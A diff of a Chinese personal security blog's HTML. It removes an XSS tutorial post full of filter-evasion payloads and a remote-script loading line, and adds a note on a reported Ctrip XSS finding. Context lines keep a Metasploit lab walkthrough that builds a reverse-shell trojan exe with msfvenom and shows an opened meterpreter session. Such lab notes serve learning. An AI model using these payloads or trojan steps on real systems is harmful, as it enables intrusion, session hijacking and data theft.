@@ -303,229 +303,8 @@
       
         
           
-            <p>记录第一个中危漏洞</p>
-<p><img src="/.top/2019/08//C:%5CUsers%5CLENOVO%5Cmyblog%5Csource_posts%5CSRC%5C1.png" alt="1"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="blog.shenzihao.top/2019/08/09/XSS/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="申子昊">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/1.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="changyouB-log">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/09/XSS/" itemprop="url">XSS</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-09T19:00:45+08:00">
-                2019-08-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="一、XSS简介"><a href="#一、XSS简介" class="headerlink" title="一、XSS简介"></a><strong>一、XSS简介</strong></h3><h3 id="二、XSS漏洞的危害"><a href="#二、XSS漏洞的危害" class="headerlink" title="二、XSS漏洞的危害"></a><strong>二、XSS漏洞的危害</strong></h3><h3 id="三、XSS漏洞的类型"><a href="#三、XSS漏洞的类型" class="headerlink" title="三、XSS漏洞的类型"></a><strong>三、XSS漏洞的类型</strong></h3><h3 id="四、XSS的构造"><a href="#四、XSS的构造" class="headerlink" title="四、XSS的构造"></a><strong>四、XSS的构造</strong></h3><h3 id="五、XSS的变形"><a href="#五、XSS的变形" class="headerlink" title="五、XSS的变形"></a><strong>五、XSS的变形</strong></h3><h3 id="六、Shellcode的调用"><a href="#六、Shellcode的调用" class="headerlink" title="六、Shellcode的调用"></a><strong>六、Shellcode的调用</strong></h3><hr>
-<h4 id="一、XSS-owasp-top-10-之一"><a href="#一、XSS-owasp-top-10-之一" class="headerlink" title="一、XSS owasp top 10 之一"></a><strong>一、XSS owasp top 10 之一</strong></h4><p>XSS 跨站脚本攻击 Cross Site Script(ing) css (层叠样式表)</p>
-<p>XSS 所用的攻击代码主要是Javascript 将恶意代码注入到网页中</p>
-<p>JS能够做到的事情，就是可能受到攻击</p>
-<p>XSS 攻击的是用户、浏览器、客户端、微博留言板的位置，有收集用户输入的地方，都有可</p>
-<p>能遭受XSS的攻击</p>
-<hr>
-<h4 id="二、盗取各种用户账号"><a href="#二、盗取各种用户账号" class="headerlink" title="二、盗取各种用户账号"></a><strong>二、盗取各种用户账号</strong></h4><p>窃取用户cookie资料，冒充用户身份进入网站</p>
-<p>劫持用户会话，执行任意操作</p>
-<p>刷流量，执行弹窗广告</p>
-<p>传播蠕虫病毒</p>
-<hr>
-<h5 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a><strong>漏洞验证</strong></h5><script>alert(/xss/)</script>
-<script>alert(%0ddocument%0a.%09cookie);</script>
-<p>&lt;scr<script>ipt>alert(/xss/)<scr<script>ipt></p>
-<script>%09alert%09(1);<script> 
-
-<script>%0dalert%0d(1);</script> 
-<script>%0aalert%0a(1);</script> 
-<script>alert(document%0a.%09cookie);</script>
-<script>alert(%0ddocument%0a.%09cookie);</script>
-</p><p>a=<a herf="%27javascri%09pt:alert(1)%27">123</a></p>
-<p><img src="/.top/2019/08//x" onerror%0a="alert(1)"></p>
-<p>只要浏览器弹框，就意味着JS代码可以被执行，就可以执行其他语句。</p>
-<p>要想弹框，最好能让浏览器识别<script>标签</p>
-<hr>
-<h4 id="三、XSS漏洞的类型-1"><a href="#三、XSS漏洞的类型-1" class="headerlink" title="三、XSS漏洞的类型"></a><strong>三、XSS漏洞的类型</strong></h4><h6 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h6><p>非持久性、参数型跨站脚本</p>
-<p>搜索框、用户登录的地方</p>
-<p>窃取用户cookie或进行钓鱼欺骗</p>
-<hr>
-<h6 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h6><p>持久性跨站脚本，更具有威胁性、恶意代码存储在数据库、其他文件等地方</p>
-<p>留言板、评论、博客日志</p>
-<p>渗透网站、挂马、蠕虫病毒、钓鱼</p>
-<hr>
-<h6 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h6><p>#<script></p>
-<p>var pos=document.URL.indexOF("context=")+8         document.write(decodeURL(document.URL.substring(pos,document.URL.length)))</script></p>
-<p>更改原来文档的DOM树</p>
-<hr>
-<h4 id="四、XSS的构造-1"><a href="#四、XSS的构造-1" class="headerlink" title="四、XSS的构造"></a><strong>四、XSS的构造</strong></h4><p>不同的浏览器效果不一样，同一款浏览器，不同版本之间效果不一样</p>
-<p>利用&lt;&gt;构造HTML/JavaScript  如果用户可以随心所欲的引入&lt;&gt;等标记，那么他就能操作一个HTML标签，然后通过<script>标签就能输入任意由JavaScript或VBscript编写的恶意脚本代码</p>
-<p>利用HTML标签的属性值进行XSS HTML中有标签，标签中有属性，属性有属性值。有的HTML标签属性值，支持Javascript:[code]</p>
-<p>#<a href="javascript:alert(/xss/)">#touch me</a></p>
-<p>产生自己的事件 事件就是用户何时做了什么事情 处理相关事件的语句，事件响应函数</p>
-<p>我们把事件分为3个不同类型</p>
-<p>用户接口（鼠标键盘）</p>
-<p>逻辑（处理的结果）</p>
-<p>变化（对文档的修改）</p>
-<p>#<img/src='x'/onerror%0A= alert(1)></p>
-<p>#<script>alert(/xss/)</script></p>
-<p>#<img src="/.top/2019/08//1.jpg" onmouseover="alert(/xss/)"></p>
-<p>#<input type="text" onkeydown="alert(/xss/)"></p>
-<p>利用CSS跨站（不太常见）使用范围比较窄</p>
-<p>#<html></html></p>
-<from method="post" action="xss.php">
-
-<p>#<textarea name="text"></textarea></p>
-<input typa="submit" name="sumbit" value="submit">
-
-</from>
-
-
-
-<hr>
-<p>#&lt;?php</p>
-<p>if(isset($_post[‘submit’])){</p>
-<p>echo $_post[‘text’];</p>
-<p>}else</p>
-<p>echo”sorry”;</p>
-<p>}</p>
-<p>?&gt;</p>
-<hr>
-<h4 id="五、XSS的变形-1"><a href="#五、XSS的变形-1" class="headerlink" title="五、XSS的变形"></a><strong>五、XSS的变形</strong></h4><h6 id="大小写转换"><a href="#大小写转换" class="headerlink" title="大小写转换"></a>大小写转换</h6><p>#<img src="/.top/2019/08//#" onerror="alert(/xss/)"></p>
-<h6 id="引号的使用"><a href="#引号的使用" class="headerlink" title="引号的使用"></a>引号的使用</h6><p>无引号</p>
-<p>#<img src="/.top/2019/08//#" onerror="alert(/xss/)/"></p>
-<p>单引号</p>
-<p>#<img src="/.top/2019/08//#" onerror="alert(/xss/)/"></p>
-<p>双引号</p>
-<p>#<img src="/.top/2019/08//#" onerror="alert(/xss/)/"></p>
-<h6 id="利用-代替空格"><a href="#利用-代替空格" class="headerlink" title="利用/代替空格"></a>利用/代替空格</h6><p>#&lt;Img/sRc=“#” Onerror=alert(/xss/)/&gt;</p>
-<h5 id="CSS中的变形"><a href="#CSS中的变形" class="headerlink" title="CSS中的变形"></a>CSS中的变形</h5><p>使用全角字符</p>
-<p>#<style>body{background-image:expre/***/ssion(alert(1);}</style></p>
-<h6 id="注释会被浏览器忽略"><a href="#注释会被浏览器忽略" class="headerlink" title="注释会被浏览器忽略"></a>注释会被浏览器忽略</h6><p>#<style>body{background-image:expression(alert(1);}</style></p>
-<p>样式表中的\和\0同样会被浏览器忽略</p>
-<p>#<style>@import’javasc\ri\0pt:alert(“xss”)’;</style></p>
-<h6 id="Tab与Enter"><a href="#Tab与Enter" class="headerlink" title="Tab与Enter"></a>Tab与Enter</h6><p>#&lt;ImgsRc=’#’ Onerror    =alert(/xss/)/&gt;</p>
-<h6 id="对标签属性值进行转码"><a href="#对标签属性值进行转码" class="headerlink" title="对标签属性值进行转码"></a>对标签属性值进行转码</h6><h6 id="拆分跨站"><a href="#拆分跨站" class="headerlink" title="拆分跨站"></a>拆分跨站</h6><p>#<script>z='alert'</script></p>
-<script>z=z+'(/xss/)'</script>
-<script>eval(z)</script>
-
-<hr>
-<h4 id="六、Shellcode的调用-1"><a href="#六、Shellcode的调用-1" class="headerlink" title="六、Shellcode的调用"></a><strong>六、Shellcode的调用</strong></h4><p>ShellCode最初是指溢出程序和蠕虫病毒的核心，实际上是指利用一个漏洞所执行的代码</p>
-<p>Exploit的英文意思是利用，通常表示完整的编写好的漏洞利用工具（或程序）Exploit往往包含来了ShellCode</p>
-<p>Poc proof of concept 的缩写，是一段证明漏洞存在的程序代码片段</p>
-<p>动态远程调用JS</p>
-<p>#<script src="http://ip/a.js"></script></p>
-<p>windows.location.hash</p>
-<p>XSS DOWNLODER</p>
-<p>将ShellCODE存储到网站的数据库中，包括网页信息、文章内容、个人资料存储的地方，然后再把它下载下来执行</p>
-<p>简单来说就是构造一个XSS下载器事先把Shellcode写在网站的某一个页面</p>
-<p>再利用XMLHTTP控件向网站发送HTTP请求然后执行返回数据</p>
-<p>备选存储技术</p>
-<p>另外一种方法是把XSS SHELLCODE 存储在客户端本地域中，如HTTPCOOKIE FISH共享对象 USEDATE</p>
+            <p>记录第一个中危漏</p>
+<p>携程XSS 漏洞  漏洞编号vulbox-2019-0201455</p>
 
           
         
@@ -652,19 +431,14 @@
 <hr>
 <p>选择以下攻击载荷并生成一个exe的木马程序</p>
 <p>命令msfconsole 开启Metasploit</p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/3be666cb7d594b598fd8e4046eaa1985/kali-2019-07-28-14-18-33.png" alt="img"></strong></p>
 <p>查看payload，使用命令show payloads，msf提供了多种攻击载荷</p>
 <p>选择以下攻击载荷（使用TAB键自动补全），并生成一个exe的木马程序</p>
 <p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.10.128 lport=4444 -f exe -o /123.exe</p>
 <p>其中，lhost为kali linx的IP地址 生成的exe文件存放在根目录下</p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/f3e31271b6d84a3d8aeb54bfae7c5e11/kali-2019-07-28-14-18-33.png" alt="img"></strong></p>
 <hr>
 <p><strong>使用命令 cd /，可以看到我们生成的exe文件</strong></p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/d9c75799d53a4f18a3e4f94ef8af9ecf/p%29la%5Drvqs%7Eeo.png" alt="img"></strong></p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/412902be4c374eb9bd8089826e25295c/lip_image001.png" alt="img"></strong></p>
 <hr>
 <p>接下来，我们需要把生成的exe文件伪装成其他文件发送到目标机上。由于实验机环境限制，为了把我们生成的exe上传到目标机上，这里我们需要使用Putty这个工具，将生成的exe文件传到win7虚拟机上。</p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/af39adfb5998456998123b985436a180/%29%60oxcj%7E5@3jt.png" alt="img"></strong></p>
 <hr>
 <p>为了不出现连接被拒绝的情况，我们首先要在kali linux上打开ssh服务，并且关闭win7防火墙。</p>
 <p>在kali linux上打开ssh服务的方法：</p>
@@ -690,11 +464,8 @@
 <p>执行命令后都会让输入密码，直接敲回车设置为空即可</p>
 <hr>
 <p><strong>Win7关闭防火墙的方法</strong></p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/123d836f10374539b156066e2f270903/%7B5%7D46%25wbx@g2.png" alt="img"></strong></p>
 <hr>
 <p>接着打开win7上win+R输入psftp.exe，使用命令 open192.168.10.128  ，连接到kali linux，使用cd /跳转到根目录下，使用命令get 文件名把文件下载到本地。</p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/5f8d282021084eb8b20d1596ae6fb71f/c%5B%5Dy3063%7Bgo0.png" alt="img"></strong></p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/eb715146576d4be4b50eb3a166b435e9/r%5Dgeugp6vuyn.png" alt="img"></strong></p>
 <hr>
 <p>在msf中设置监听</p>
 <p>use exploit/multi/handler </p>
@@ -718,7 +489,7 @@
 <p>[*] Sending stage (179779 bytes) to 192.168.10.1</p>
 <p>[*] Sleeping before handling stage…</p>
 <p>[*] Meterpreter session 1 opened (192.168.10.128:4444 -&gt; 192.168.10.1:53292) at 2019-07-28 14:08:08 +0800</p>
-<p><strong><img src="/.top/2019/08//%E8%BD%AF%E4%BB%B6/%E7%AC%94%E8%AE%B0/szhchangyou@163.com/db4f70ac13d9430db99e977fda8f967f/kali-2019-07-28-14-10-43.png" alt="img"></strong></p>
+<hr>
 <hr>
 <h3 id="实验结束"><a href="#实验结束" class="headerlink" title="实验结束"></a>实验结束</h3>
           
@@ -935,7 +706,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">4</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
